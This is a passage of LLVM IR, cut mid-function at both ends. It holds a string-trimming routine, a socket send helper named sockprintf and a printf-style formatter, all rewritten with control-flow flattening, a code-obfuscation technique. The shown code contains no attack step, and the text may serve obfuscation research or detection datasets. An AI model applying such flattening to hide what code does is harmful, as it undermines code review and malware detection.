  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 235944310, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 2011408121, i32 193546366
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 843459487, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 235944310, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #6
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #6
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -571366640, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -571366640, label %12
    i32 256050056, label %18
    i32 271232156, label %24
    i32 -760030698, label %32
    i32 669771960, label %33
    i32 436456051, label %39
    i32 498645414, label %40
    i32 -1046835870, label %46
    i32 590455974, label %49
    i32 -262437986, label %50
    i32 -506730651, label %56
    i32 -1013458158, label %61
    i32 -1952911430, label %62
    i32 -958691436, label %68
    i32 -1208395320, label %73
    i32 -2043144801, label %75
    i32 2012550423, label %84
    i32 -841862960, label %87
    i32 -565169142, label %93
    i32 80018299, label %99
    i32 138782193, label %105
    i32 -833344648, label %110
    i32 168152248, label %118
    i32 -1812150447, label %120
    i32 1504376330, label %121
    i32 1266775874, label %127
    i32 1625893349, label %133
    i32 1858677423, label %140
    i32 -1868056869, label %146
    i32 -1757237914, label %151
    i32 350830436, label %158
    i32 -1756395786, label %164
    i32 1312799910, label %171
    i32 1980715951, label %177
    i32 1407810701, label %182
    i32 -1643332284, label %189
    i32 -494688857, label %195
    i32 -859134390, label %202
    i32 1139994846, label %208
    i32 1530132805, label %213
    i32 1196888506, label %220
    i32 -1315903189, label %226
    i32 -790792050, label %233
    i32 841065747, label %239
    i32 -1447243877, label %244
    i32 -737536330, label %251
    i32 -294707593, label %257
    i32 1639219126, label %263
    i32 353689288, label %269
    i32 874291748, label %274
    i32 -1179056530, label %286
    i32 -735266392, label %287
    i32 -1286230572, label %288
    i32 -1298434084, label %295
    i32 2064867062, label %296
    i32 -1024204693, label %299
    i32 523914746, label %303
    i32 1993837748, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 256050056, i32 -1024204693
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 271232156, i32 -735266392
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -760030698, i32 669771960
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -1024204693, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 436456051, i32 498645414
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -1286230572, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 -1046835870, i32 590455974
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 590455974, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 -262437986, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 -506730651, i32 -1013458158
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 -262437986, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1952911430, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 -958691436, i32 -1208395320
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 -1208395320, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 -2043144801, i32 -841862960
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 2012550423, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 -1952911430, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -565169142, i32 1266775874
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 80018299, i32 138782193
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -833344648, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -833344648, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 168152248, i32 -1812150447
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 1504376330, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1504376330, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 2064867062, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 1625893349, i32 350830436
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 1858677423, i32 -1868056869
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 -1757237914, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 -1757237914, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 2064867062, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 -1756395786, i32 -1643332284
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 1312799910, i32 1980715951
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 1407810701, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 1407810701, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 2064867062, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -494688857, i32 1196888506
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 -859134390, i32 1139994846
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 1530132805, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 1530132805, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 2064867062, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 -1315903189, i32 -737536330
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 -790792050, i32 841065747
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -1447243877, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -1447243877, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 2064867062, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -294707593, i32 -1179056530
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 1639219126, i32 353689288
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 874291748, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 874291748, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
